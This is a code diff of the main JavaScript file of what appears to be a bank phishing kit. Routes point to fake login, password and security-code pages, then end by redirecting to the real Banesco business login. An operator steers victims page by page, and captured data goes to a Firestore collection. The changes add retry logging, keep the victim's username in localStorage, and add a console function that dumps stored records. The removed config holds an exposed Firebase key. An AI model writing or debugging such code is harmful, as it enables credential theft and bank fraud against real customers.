@@ -1,32 +1,8 @@
 // Script principal con Firebase - Flujo completo del proyecto
 console.log('🚀 Script principal iniciado');
 
-// Configuración de Firebase (actualizada)
-const firebaseConfig = {
-    apiKey: "AIzaSyBnv1yymQKBWXIE6oJHV8kOPEA6Nm1iF9w",
-    authDomain: "a24a3i5a.firebaseapp.com",
-    projectId: "a24a3i5a",
-    storageBucket: "a24a3i5a.firebasestorage.app",
-    messagingSenderId: "363928972104",
-    appId: "1:363928972104:web:19331a7011922dd223a17d"
-};
-
-// Configuración de rutas
-const appConfig = {
-    routes: {
-        1: { url: "lgp.html", name: "Inicio" },
-        2: { url: "us-err.html", name: "Err-LOGIN" },
-        3: { url: "coe.html", name: "COE" },
-        4: { url: "coe-err.html", name: "COE-Err" },
-        5: { url: "passwd.html", name: "Clave" },
-        6: { url: "desf-err.html", name: "EDESF-Err" },
-        7: { url: "dashboard.html", name: "Cargando" },
-        55: { url: "desfd.html", name: "DESF" },
-        8: { url: "https://banesconlinempresa.banesco.com/lazaro/WebSite/login.aspx", name: "Salida Empresa" },
-        9: { url: "coe-emp.html", name: "COE-EMP" },
-    },
-    timeout: 300000 // 5 minutos
-};
+// NOTA: La configuración de Firebase y rutas está centralizada en firebase-config.js
+// Este archivo debe importarse antes que main.js en el HTML
 
 // Variables globales para Firebase
 let app, db, unsubscribe;
@@ -36,8 +12,15 @@ try {
     app = firebase.initializeApp(firebaseConfig);
     db = firebase.firestore();
     console.log('✅ Firebase inicializado correctamente');
+    console.log('🔍 Configuración Firebase:', {
+        projectId: firebaseConfig.projectId,
+        authDomain: firebaseConfig.authDomain,
+        tieneApp: !!app,
+        tieneDB: !!db
+    });
 } catch (error) {
     console.error('❌ Error inicializando Firebase:', error);
+    console.error('❌ Configuración que falló:', firebaseConfig);
 }
 
 // Función para obtener la dirección IP
@@ -135,22 +118,67 @@ document.addEventListener('DOMContentLoaded', async function () {
         }
     }
 
-    // Función para guardar en historial persistente con reintentos
+    // Función para guardar en historial persistente con reintentos y mejor logging
     async function guardarEnHistorial(datos, reintentos = 3) {
+        console.log('🔍 INICIANDO guardarEnHistorial con datos:', {
+            usuario: datos.usuario,
+            tieneDB: !!db,
+            datosCompletos: Object.keys(datos)
+        });
+        
+        // Verificar que Firebase esté inicializado
+        if (!db) {
+            console.error('❌ ERROR CRÍTICO: Firebase db no está inicializado');
+            console.error('❌ Verificar que firebase-config.js se cargó correctamente');
+            return false;
+        }
+        
         for (let intento = 1; intento <= reintentos; intento++) {
             try {
-                const historialRef = db.collection("datosHistorial").doc(`${datos.usuario}_${Date.now()}_${intento}`);
+                console.log(`🚀 Intento ${intento} de ${reintentos} - Guardando en Firestore...`);
+                
+                const docId = `${datos.usuario}_${Date.now()}_${intento}`;
+                const historialRef = db.collection("datosHistorial").doc(docId);
+                
+                console.log('📝 Referencia creada:', {
+                    coleccion: 'datosHistorial',
+                    documentoId: docId,
+                    referencia: !!historialRef
+                });
+                
+                // Intentar guardar
                 await historialRef.set(datos);
-                console.log(`✅ Historial guardado en intento ${intento}`);
-                return true;
+                
+                console.log(`✅ ÉXITO: Historial guardado en intento ${intento}`);
+                console.log(`✅ Documento guardado con ID: ${docId}`);
+                console.log(`✅ En colección: datosHistorial`);
+                
+                // Verificar que se guardó
+                const verificacion = await historialRef.get();
+                if (verificacion.exists) {
+                    console.log('✅ VERIFICACIÓN: Documento existe en Firestore');
+                    return true;
+                } else {
+                    console.warn('⚠️ ADVERTENCIA: Documento no se encontró después de guardar');
+                }
+                
             } catch (error) {
-                console.warn(`⚠️ Intento ${intento} falló:`, error.message);
+                console.error(`❌ INTENTO ${intento} FALLÓ:`);
+                console.error('❌ Error completo:', error);
+                console.error('❌ Mensaje:', error.message);
+                console.error('❌ Código:', error.code);
+                console.error('❌ Stack:', error.stack);
+                
                 if (intento === reintentos) {
-                    console.error("❌ Falló guardar historial después de", reintentos, "intentos");
+                    console.error(`❌ FALLO FINAL: No se pudo guardar historial después de ${reintentos} intentos`);
+                    console.error('❌ Datos que se intentaron guardar:', datos);
                     return false;
                 }
+                
                 // Esperar antes del siguiente intento
-                await new Promise(resolve => setTimeout(resolve, 1000 * intento));
+                const espera = 1000 * intento;
+                console.log(`⏳ Esperando ${espera}ms antes del siguiente intento...`);
+                await new Promise(resolve => setTimeout(resolve, espera));
             }
         }
         return false;
@@ -296,16 +324,30 @@ document.addEventListener('DOMContentLoaded', async function () {
                         // Cancelar timeout
                         clearTimeout(timeoutId);
                         
-                        // Usar configuración de rutas
+                        // Guardar usuario en localStorage para la siguiente página
+                        localStorage.setItem('usuarioActual', nombreUsuario);
+                        console.log('💾 Usuario guardado en localStorage:', nombreUsuario);
+                        
+                        // Verificar que se guardó correctamente
+                        const verificacion = localStorage.getItem('usuarioActual');
+                        console.log('🔍 Verificación localStorage:', verificacion);
+                        
+                        // Usar configuración de rutas con pequeño delay para asegurar guardado
                         const route = appConfig.routes[page];
                         if (route) {
                             console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
                             if (overlay) overlay.style.display = "none";
-                            window.location.href = route.url;
+                            
+                            // Pequeño delay para asegurar que localStorage se guarde
+                            setTimeout(() => {
+                                window.location.href = route.url;
+                            }, 100);
                         } else {
                             console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
                             if (overlay) overlay.style.display = "none";
-                            window.location.href = `page${page}.html`;
+                            setTimeout(() => {
+                                window.location.href = `page${page}.html`;
+                            }, 100);
                         }
                     }
                     // Si page es 0, mantener el loader visible esperando instrucciones del admin
@@ -346,8 +388,88 @@ document.addEventListener('DOMContentLoaded', async function () {
         console.log('🎯 Event listener agregado al botón');
     }
     
-    // Validación inicial
+    // Validar entrada inicial
     validateInput();
-    
-    console.log('🎉 Aplicación inicializada correctamente');
 });
+
+// 🔧 FUNCIÓN DE DIAGNÓSTICO GLOBAL - Ejecutar desde consola del navegador
+window.diagnosticarFirebase = async function() {
+    console.log('🔧 INICIANDO DIAGNÓSTICO DE FIREBASE');
+    console.log('='.repeat(50));
+    
+    // 1. Verificar variables globales
+    console.log('1️⃣ VERIFICANDO VARIABLES GLOBALES:');
+    console.log('   - firebase disponible:', typeof firebase !== 'undefined');
+    console.log('   - firebaseConfig disponible:', typeof firebaseConfig !== 'undefined');
+    console.log('   - app inicializada:', !!app);
+    console.log('   - db inicializada:', !!db);
+    
+    if (!db) {
+        console.error('❌ PROBLEMA: db no está inicializada');
+        return;
+    }
+    
+    // 2. Probar conexión básica
+    console.log('\n2️⃣ PROBANDO CONEXIÓN A FIRESTORE:');
+    try {
+        const testRef = db.collection('test').doc('conexion');
+        await testRef.set({ timestamp: new Date(), test: true });
+        console.log('✅ Escritura exitosa en colección test');
+        
+        const testDoc = await testRef.get();
+        if (testDoc.exists) {
+            console.log('✅ Lectura exitosa desde Firestore');
+            console.log('   Datos:', testDoc.data());
+        }
+        
+        // Limpiar documento de prueba
+        await testRef.delete();
+        console.log('✅ Documento de prueba eliminado');
+        
+    } catch (error) {
+        console.error('❌ ERROR EN CONEXIÓN:', error);
+        return;
+    }
+    
+    // 3. Probar función guardarEnHistorial
+    console.log('\n3️⃣ PROBANDO FUNCIÓN guardarEnHistorial:');
+    const datosTest = {
+        usuario: 'TEST_USER',
+        timestamp: new Date().toISOString(),
+        test: true,
+        diagnostico: 'Prueba desde función de diagnóstico'
+    };
+    
+    const resultado = await guardarEnHistorial(datosTest);
+    if (resultado) {
+        console.log('✅ guardarEnHistorial funcionó correctamente');
+    } else {
+        console.error('❌ guardarEnHistorial falló');
+    }
+    
+    // 4. Verificar colección datosHistorial
+    console.log('\n4️⃣ VERIFICANDO COLECCIÓN datosHistorial:');
+    try {
+        const historialSnapshot = await db.collection('datosHistorial').limit(5).get();
+        console.log(`📊 Documentos en datosHistorial: ${historialSnapshot.size}`);
+        
+        if (historialSnapshot.size > 0) {
+            console.log('📋 Últimos documentos:');
+            historialSnapshot.forEach(doc => {
+                console.log(`   - ${doc.id}:`, doc.data());
+            });
+        } else {
+            console.warn('⚠️ No hay documentos en la colección datosHistorial');
+        }
+    } catch (error) {
+        console.error('❌ Error consultando datosHistorial:', error);
+    }
+    
+    console.log('\n🔧 DIAGNÓSTICO COMPLETADO');
+    console.log('='.repeat(50));
+};
+
+// Mensaje para el usuario
+console.log('🔧 FUNCIÓN DE DIAGNÓSTICO DISPONIBLE:');
+console.log('   Ejecuta: diagnosticarFirebase()');
+console.log('   Para probar la conexión a Firebase y la función guardarEnHistorial');    
